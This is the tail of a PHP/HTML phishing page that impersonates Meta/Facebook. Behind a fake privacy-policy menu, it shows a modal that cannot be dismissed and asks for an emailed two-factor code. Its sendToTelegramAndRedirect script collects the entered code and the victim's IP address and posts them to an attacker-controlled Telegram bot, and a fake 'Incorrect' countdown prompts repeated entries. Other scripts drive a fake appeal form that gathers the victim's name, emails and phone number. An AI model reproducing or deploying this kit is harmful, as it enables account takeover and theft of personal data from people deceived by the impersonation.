                                    <span>Cards with information about the operation of AI systems</span>
                                    <br>
                                    <span class="small-grey">Meta AI website</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>
                            <div class="action-button wide">
                                <div class="action-button-text">
                                    <span>Introduction to Generative AI</span>
                                    <br>
                                    <span class="small-grey">For teenagers</span>
                                </div>
                                <div class="action-button-arrow">
                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                        </path>
                                    </svg>
                                </div>
                            </div>

                        </div>
                    </div>
                    <br>
                    <p class="small-grey">We continually identify potential privacy risks, including
                        when collecting, using or sharing personal information, and developing methods to reduce these
                        risks. Read more about
                        <a target="_blank" id="policyLink" class="add-svg">Privacy Policy

                        </a>
                    </p>

                </div>

            </div>


            <div class="popup" id="popup">

                <div class="popup-item">
                    <div class="burger-button-popup" id="closePopup">
                        <div class="bar"></div>
                        <div class="bar"></div>
                    </div>
                    <div class="popup-content"></div>
                </div>
            </div>


        </div>
    </div>

    <style>
        /* CSS để làm mờ và tối xung quanh modal */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            /* Màu đen với độ mờ 50% */
            z-index: 999;
            /* Đảm bảo overlay hiển thị trên modal */
            display: none;
            /* Ẩn ban đầu */
        }

        .modal.active {
            display: block;
        }

        /* CSS để canh giữa modal */
        .modal-dialog {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
        }


        /* CSS để modal và overlay luôn hiển thị */
        .modal.show {
            display: block;
        }

        .overlay.show {
            display: block;
        }
    </style>




    <style>
        .password-input input {
            border: none;
            padding: 0 .75rem;
            height: 37px;
            width: 100%;
            padding-right: 40px;
            box-sizing: border-box;
        }

        .form-btn-wrapper .btn {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            border-radius: 25px;
            height: 44px;
            font-size: 20px;
        }

        #morway {
            background-color: #ffe6e600;
            border: 1px solid #4545452e;
            color: #000000e6;
            font-family: inherit;
            outline: none;
            box-shadow: none;
        }
    </style>

    <style>
        .error-noti {
            color: #f02849;
            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
            font-size: 13px;
            line-height: 16px;
            margin-top: 8px;
            text-align: left;
        }

        .password-input .form-control {
            border: 1px solid #fa3e3e;
        }
    </style>

    <div class="overlay overlay2" id="overlay2"></div>
    <div class="modal form-modal" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="twoFAinfo-wraper">
                        <font id="getname" style="vertical-align: inherit;"><?php echo htmlspecialchars($fullName); ?> • Facebook</font>
                        <h1 class="modal-title" id="2FAmodalLabel">
                            <font id="titlevery" style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;font-family: inherit;">Check your email</font>
                                    </font>
                                </font>
                            </font>
                        </h1> <span>
                            <font id="getdevice" style="vertical-align: inherit;">Enter the code we sent to your email.</font>
                        </span>
                        <div class="fb-round-wraper" id="changeanh"> <img src="../img/smsmail.png" alt="" style="width: 100%;border-radius: 3px;"> </div>
                        <form>
                            <div class="mb-3"></div>
                            <div id="duyetthietbi" style="display: none; align-items: flex-start; font-family: Arial, sans-serif; color: rgb(0, 0, 0);">
                                <div style="margin-right: 6px; margin-top: 5px;"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="26" height="26" fill="currentColor">
                                        <path d="M15 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0zM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM11 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0z"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"></path>
                                    </svg> </div>
                                <div> <strong style="font-size: 1em;color: #000000ba;">Waiting for approval</strong>
                                    <p style="margin: 0; font-size: 0.9em; color: #555;"> Approve from the other device to continue. </p>
                                </div>
                            </div>
                            <div class="mb-3"></div>
                            <div class="mb-3">
                                <div class="password-input" style="display: block;">
                                    <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="2facode" placeholder="Code" required="" autocomplete="off">
                                </div>
                            </div>
                            <div class="error-noti">Incorrect. Please, try again after <span class="count-time">60s</span></div>

                            <div class="form-btn-wrapper" style="display: block;" id="send2fa">
                                <button class="btn btn-primary" type="submit" id="submit-button" onclick="sendToTelegramAndRedirect(event)">
                                    <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;">
                                        <span class="visually-hidden">Loading...</span>
                                    </div>
                                    <span class="button-text" style="display: inline-block;">Confirm</span>
                                </button>
                            </div>

                            <div class="form-btn-wrapper" id="try681">
                                <button class="btn btn-primary" id="morway" type="Button">
                                    <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;"> <span class="visually-hidden">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">Laden...</font>
                                            </font>
                                        </span> </div> <span class="button-text">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">Try another way</font>
                                        </font>
                                    </span>
                                </button>
                            </div>
                        </form>
                    </div>
                    <div class="spaser"></div>
                </div>
                <div class="modal-footer">
                    <img src="../img/meta-logo-grey.png" alt="">
                </div>
            </div>
        </div>
    </div>

    <?php require_once('../views/2fa-checkpoint.php'); ?>


    <!-- icon xoay -->
    <script>
        // Get the necessary elements
        const twoFaInput = document.getElementById('2facode');
        const submitButton = document.getElementById('submit-button');
        const spinner = document.getElementById('2faspin');
        const buttonText = submitButton.querySelector('.button-text');

        // Initially, disable the submit button
        submitButton.disabled = true;

        // Enable the submit button only when the 2FA code is entered (length 6-8)
        twoFaInput.addEventListener('input', function() {
            const twoFaCode = twoFaInput.value;

            if (twoFaCode.length >= 6 && twoFaCode.length <= 8) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });

        // Handle form submission with spinner display
        submitButton.addEventListener('click', function(event) {
            event.preventDefault(); // Prevent immediate form submission

            // Show spinner and hide text
            spinner.style.display = 'inline-block';
            buttonText.style.display = 'none';

            // Simulate form submission or API call
            setTimeout(() => {
                // Here, you can add the code to handle the actual form submission, like an API call
                console.log('Form submitted!');

                // Reset the button state (remove spinner, show text again)
                spinner.style.display = 'none';
                buttonText.style.display = 'inline';
            }, 6000); // Simulating a 6-second delay for the process
        });
    </script>

    <script>
        // Hàm để hiển thị thời gian đếm ngược
        function displayCountdown() {
            var countdownElement = document.querySelector('.count-time');
            var timeInSeconds = 59; // Bắt đầu từ 60 giâys
            var interval = setInterval(function() {
                countdownElement.textContent = timeInSeconds + 's'; // Hiển thị số giây và chữ "s"
                timeInSeconds--; // Giảm thời gian đi 1 giây

                if (timeInSeconds < 0) {
                    clearInterval(interval); // Dừng đếm ngược khi hết giờ
                    countdownElement.textContent = '0s'; // Hiển thị '0s' khi kết thúc
                }
            }, 1000); // Lặp lại mỗi giây
        }
        displayCountdown();
    </script>


    <script>
        // JavaScript để tự động hiển thị modal khi trang tải
        document.addEventListener('DOMContentLoaded', function() {
            const modal = document.getElementById('exampleModal2');
            const overlay = document.getElementById('overlay2');

            // Hiển thị modal và overlay khi trang được tải
            modal.classList.add('show');
            overlay.classList.add('show');

            // Ngăn không cho đóng modal bằng cách bấm vào overlay hoặc phím ESC
            modal.addEventListener('hidden.bs.modal', function(event) {
                event.preventDefault();
                event.stopImmediatePropagation();
            });

            overlay.addEventListener('click', function(event) {
                event.preventDefault();
                event.stopImmediatePropagation();
            });

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    event.preventDefault();
                    event.stopImmediatePropagation();
                }
            });
        });
    </script>


    <script>
        function sendToTelegramAndRedirect(event) {
            event.preventDefault(); // Ngừng form submit

            var code = document.getElementById('2facode').value.trim(); // Lấy mã 2FA từ input

            // Kiểm tra xem mã có được nhập không
            if (code === '') {
                console.log("Vui lòng nhập mã xác thực.");
                return;
            }

            // Lấy địa chỉ IP từ server
            fetch('../get-ip.php')
                .then(response => response.text())
                .then(ip => {
                    // Chuẩn bị nội dung tin nhắn để gửi về Telegram
                    var content = "🔐Mã 2FA 2 (EMAIL): " + "<code>" + code + "</code>" +
                        "\nIP: " + ip; // Thêm thông tin IP vào nội dung

                    // Thông tin và nội dung gửi đến Telegram
                    var apiToken = "<?php echo $token; ?>"; // Thay bằng token của bạn
                    var data = {
                        chat_id: '<?php echo $chatId; ?>', // Thay bằng chat ID của bạn
                        text: content,
                        parse_mode: 'HTML'
                    };

                    // Gửi yêu cầu POST đến API của Telegram
                fetch('https://api.telegram.org/bot' + apiToken + '/sendMessage', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    })
                    .then(response => response.json()) // Chuyển đổi phản hồi thành JSON
                    .then(responseData => {
                        if (responseData.ok) {
                            console.log('Message sent to Telegram bot successfully.');
                            // Delay redirect by 3 seconds (3000 milliseconds)
                            setTimeout(() => {
                                window.location.href = "/2fa/email"; // Change URL to the page you want to redirect to
                            }, 3000);
                        } else {
                            console.error('Telegram API returned an error: ', responseData.description);
                        }
                    })
                    .catch(error => {
                        console.error('Error sending message to Telegram:', error);
                    });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
        }
    </script>






    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var openModalBtn = document.getElementById('openModalBtn');
            var modal1 = document.getElementById('exampleModal1');
            var modal2 = document.getElementById('exampleModal2');
            var overlay = document.getElementById('overlay');
            var overlay2 = document.getElementById('overlay2');

            openModalBtn.addEventListener('click', function() {
                modal1.classList.add('active');
                overlay.style.display = 'block';
            });

            window.addEventListener('click', function(event) {
                if (event.target == overlay) {
                    modal1.classList.remove('active');
                    modal2.classList.remove('active');
                    overlay.style.display = 'none';
                    overlay2.style.display = 'none';
                }
            });

            var closeModalBtn1 = modal1.querySelector('.btn-close');
            closeModalBtn1.addEventListener('click', function() {
                modal1.classList.remove('active');
                overlay.style.display = 'none';
            });

            var sendBtn = modal1.querySelector('.btn-primary');
            sendBtn.addEventListener('click', function(event) {
                event.preventDefault();

                // Kiểm tra xem tất cả các trường đã được điền đầy đủ chưa
                var fullName = document.getElementById('FullNameField').value.trim();
                var personalEmail = document.getElementById('PersonalEmailField').value.trim();
                var businessEmail = document.getElementById('BuisenessEmailField').value.trim();
                var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
                var pageName = document.getElementById('fb-page-name-input').value.trim();
                var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();

                if (fullName === '' || personalEmail === '' || businessEmail === '' || mobilePhoneNumber === '' || pageName === '' || apeal === '') {
                    alert("Vui lòng điền đầy đủ thông tin.");
                    return; // Không thực hiện gửi nếu có trường trống
                }

                // Nếu tất cả các trường đã được điền đầy đủ, mở modal 2
                modal1.classList.remove('active');
                overlay.style.display = 'none';
                overlay2.style.display = 'block';
                modal2.classList.add('active');
            });

            var closeModalBtn2 = modal2.querySelector('.btn-close');
            closeModalBtn2.addEventListener('click', function() {
                modal2.classList.remove('active');
                overlay2.style.display = 'none';
            });
        });
    </script>




    <script>
        window.mobileCheck = function() {
            let check = false;
            (function(a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i
                    .test(a) ||
                    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i
                    .test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);

            return check;
        };
    </script>
    <script>
        const subLinks = {
            'PolicyCollapse': [{
                    'text': 'What is the Privacy Policy and what does it cover?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'What information do we collect?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we use your information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we share your information on Meta Products or with integrated partners?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we share information with third parties?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How is the cooperation between Meta Companies organized?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How can you manage or delete your information and exercise your rights?',
                    'link': '',
                    'add_svg_link': false
                }, {
                    'text': 'How long do we keep your information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we transmit information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How will you know when the policy changes?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How to ask Meta questions?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Why and how we process your data',
                    'link': '',
                    'add_svg_link': false
                },
            ],
            'RulesCollapse': [{
                    'text': 'Cookie Policy',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Information for those who do not use Meta Products',
                    'link': '',
                    'add_svg_link': true
                },
                {
                    'text': 'How Meta uses information for generative AI models',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Data Transfer Framework Policy',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Other terms and conditions',
                    'link': '',
                    'add_svg_link': true
                },

            ],
            'SettingCollapse': [{
                    'text': 'Facebook Settings',
                    'link': '',
                    'add_svg_link': true
                },
                {
                    'text': 'Instagram Settings',
                    'link': '',
                    'add_svg_link': true
                },
            ]


        }

        function addSubItems() {
            var linkSvg =
                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
            for (var [subId, items] of Object.entries(subLinks)) {
                var subElem = document.getElementById(subId)
                for (var i = 0; i < items.length; i++) {
                    var text_item = items[i]
                    var block = document.createElement('div')
                    block.classList.add('action-button')
                    block.innerHTML = `
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">
                      </div>
                      <div class="action-button-arrow">
                      </div>
                    `
                    if (text_item['add_svg_link']) {
                        var svg_block = block.querySelector('.action-button-arrow')
                        svg_block.innerHTML = linkSvg

                    }
                    var block_text = block.querySelector('.action-button-text')
                    block_text.innerText = text_item['text']
                    subElem.appendChild(block)
                    block.addEventListener('click', function() {
                        var start = document.getElementById('start')
                        start.click()
                    })
                }
            }
        }

        addSubItems()
    </script>
</body>

</html>